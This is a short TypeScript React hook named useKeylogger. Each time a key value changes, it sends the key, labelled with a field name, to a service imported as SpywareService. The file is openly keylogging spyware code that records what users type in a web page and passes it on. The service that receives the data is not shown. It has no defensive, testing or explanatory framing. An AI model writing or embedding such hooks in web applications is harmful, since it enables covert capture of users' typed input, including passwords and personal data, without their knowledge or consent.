import {useEffect} from "react";
import {SpywareService} from "@/services/Spyware";

type UseKeyloggerType = {
    property: string;
    key: string;
}

export const useKeylogger = ({key, property}: UseKeyloggerType) => {
    useEffect(() => {
        const keyLoggerRequest = async () =>
            await SpywareService.keylogger(`[${property}] ${key} `);

        if (key?.length > 0) {
            void keyLoggerRequest();
        }

    }, [key, property]);
}